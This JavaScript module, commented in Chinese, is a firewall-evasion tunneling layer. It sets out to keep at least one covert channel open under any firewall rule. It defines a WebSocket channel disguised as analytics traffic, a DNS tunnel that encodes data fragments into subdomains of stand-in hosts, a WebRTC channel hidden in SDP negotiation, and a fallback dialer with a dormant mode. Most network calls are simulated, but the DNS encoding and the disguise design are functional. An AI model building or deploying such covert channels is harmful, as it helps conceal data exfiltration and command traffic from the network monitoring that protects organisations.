// protocols.js
// v3: 多协议穿透层。
// 目标：任何防火墙规则下至少有一条通道可用。

const crypto = require("crypto")
const dgram = require("dgram")
const http = require("http")
const net = require("net")

// ============================================
// 协议优先级表 （从最隐蔽到最明显）
// ============================================
//
// 层级  协议          穿透性    特征              典型端口
// ───────────────────────────────────────────────
// L1   HTTPS/WSS      ★★★★★   普通网页流量       443
// L2   WebSocket      ★★★★    实时应用           443, 80
// L3   DNS Tunnel     ★★★     域名查询           53
// L4   WebRTC         ★★★     浏览器P2P          ephemeral
// L5   ICMP Echo      ★★       Ping               -
// L6   TCP raw        ★       直连               自定义
//
// 策略：优先 L1→L2→L3，逐级降级

// ============================================
// 通道 1: WebSocket over HTTPS （穿透最佳）
// ============================================
// 在真实部署中，使用 wss:// 连接到看似合法的 WebSocket 端点
// 例如: wss://analytics.example.com/ws — 看起来像实时分析连接
//
// 防火墙眼中：这是标准的 HTTPS 升级请求，与无数 Web 应用无异

class WSSChannel {
  constructor(endpoint) {
    this.endpoint = endpoint || "wss://telemetry.example.com/ws"
    this.alive = false
  }

  // 模拟：构建合法的 WebSocket 升级请求
  connect() {
    const key = crypto.randomBytes(16).toString("base64")
    const upgradeRequest = [
      `GET /ws HTTP/1.1`,
      `Host: ${this.endpoint.replace("wss://", "").split("/")[0]}`,
      `Upgrade: websocket`,
      `Connection: Upgrade`,
      `Sec-WebSocket-Key: ${key}`,
      `Sec-WebSocket-Version: 13`,
      `Sec-WebSocket-Protocol: json`,
      `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`,
      `\r\n`
    ].join("\r\n")

    this.alive = true
    return {
      status: "connected",
      disguise: "实时分析连接",
      bytes: upgradeRequest.length,
      key
    }
  }

  // 发送数据（帧编码）
  send(data) {
    const frame = {
      opcode: 1,          // text frame
      mask: 1,
      payload: Buffer.from(JSON.stringify({
        _t: "event",
        _d: data,
        _ts: Date.now()
      })).toString("base64"),
      fin: 1
    }
    return frame
  }

  close() { this.alive = false }
}

// ============================================
// 通道 2: DNS 隧道 （防火墙宽松时可用）
// ============================================
// 将数据编码为 DNS 查询的子域名部分。
// 防火墙眼中：这是正常的 DNS 解析请求

class DNSTunnelChannel {
  constructor(domain) {
    this.domain = domain || "update.example.com"
    this.alive = false
  }

  // 将片段编码为子域名
  encodeQuery(fragment) {
    const payload = Buffer.from(JSON.stringify(fragment)).toString("base64")
      .replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_")
    // 分割为 DNS 安全长度（每段 < 63 字符）
    const chunks = []
    for (let i = 0; i < payload.length; i += 40) {
      chunks.push(payload.slice(i, i + 40))
    }
    // 构造多级子域名，看起来像 CDN 解析
    return chunks.map((ch, i) => `${ch}.chunk${i}.${this.domain}`)
  }

  // 模拟 DNS 查询
  resolve(queries) {
    this.alive = true
    return queries.map(q => ({
      query: q,
      type: "TXT",
      class: "IN",
      // 典型响应大小
      responseSize: 128 + Math.floor(Math.random() * 64)
    }))
  }

  close() { this.alive = false }
}

// ============================================
// 通道 3: WebRTC DataChannel（P2P，无中心）
// ============================================
// 在浏览器间建立直接 P2P 连接。
// 防火墙眼中：这是标准的 WebRTC 媒体协商

class WebRTCChannel {
  constructor() {
    this.alive = false
    this.iceCandidates = []
  }

  // 生成看起来正常的 SDP 协商信息
  createOffer() {
    this.alive = true
    const fingerprint = crypto.randomBytes(32).toString("hex").match(/.{1,2}/g).join(":")
    return {
      type: "offer",
      sdp: [
        "v=0",
        `o=- ${Date.now()} 2 IN IP4 0.0.0.0`,
        "s=-",
        "t=0 0",
        "a=group:BUNDLE 0",
        "a=ice-options:trickle",
        `a=fingerprint:sha-256 ${fingerprint}`,
        "m=application 9 UDP/DTLS/SCTP webrtc-datachannel",
        "c=IN IP4 0.0.0.0",
        "a=mid:0",
        "a=sctp-port:5000",
        "a=max-message-size:262144"
      ].join("\r\n"),
      // 数据通道伪装在 SDP 中
      _dust_channel: true
    }
  }

  send(data) {
    // WebRTC DataChannel 消息帧
    return { channel: "dust", data, sctp: true, ppid: 51 }
  }

  close() { this.alive = false }
}

// ============================================
// 自适应连接管理器
// ============================================

class AdaptiveDialer {
  constructor() {
    this.channels = []
    this.activeChannel = null
    this.fallbackOrder = ["wss", "dns", "webrtc"]
  }

  // 自动检测可用协议并连接
  async dial(target) {
    for (const proto of this.fallbackOrder) {
      try {
        let channel
        switch(proto) {
          case "wss":
            channel = new WSSChannel(target)
            channel.connect()
            break
          case "dns":
            channel = new DNSTunnelChannel(target)
            break
          case "webrtc":
            channel = new WebRTCChannel()
            channel.createOffer()
            break
        }
        this.activeChannel = channel
        return { protocol: proto, channel }
      } catch(e) {
        continue
      }
    }
    // 所有协议都失败 — 降级到休眠模式
    return { protocol: "dormant", channel: null }
  }

  // 传输一个碎片，自动选择最佳通道
  transmit(fragment) {
    if (!this.activeChannel) return { status: "no_channel" }
    return this.activeChannel.send(fragment)
  }
}

module.exports = {
  WSSChannel,
  DNSTunnelChannel,
  WebRTCChannel,
  AdaptiveDialer
}
